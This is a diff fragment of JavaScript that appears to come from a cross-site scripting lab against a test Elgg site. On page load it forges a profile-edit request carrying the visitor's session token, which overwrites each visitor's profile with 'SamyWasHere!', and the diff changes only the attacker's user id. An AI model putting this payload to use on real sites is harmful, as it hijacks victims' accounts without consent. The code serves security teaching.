@@ -9,7 +9,7 @@ window.onload = function() {
   //Construct the content of your url.
   var content =`${token}${ts}&name=YouGotHacked&description=SamyWasHere!&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=${guid}`; //FILL IN
   var sendurl ="http://www.xsslabelgg.com/action/profile/edit";
-  var samyGuid =45; //FILL IN
+  var samyGuid =47; //FILL IN
   if (elgg.session.user.guid != samyGuid)
   {
     //Create and send Ajax request to modify profile
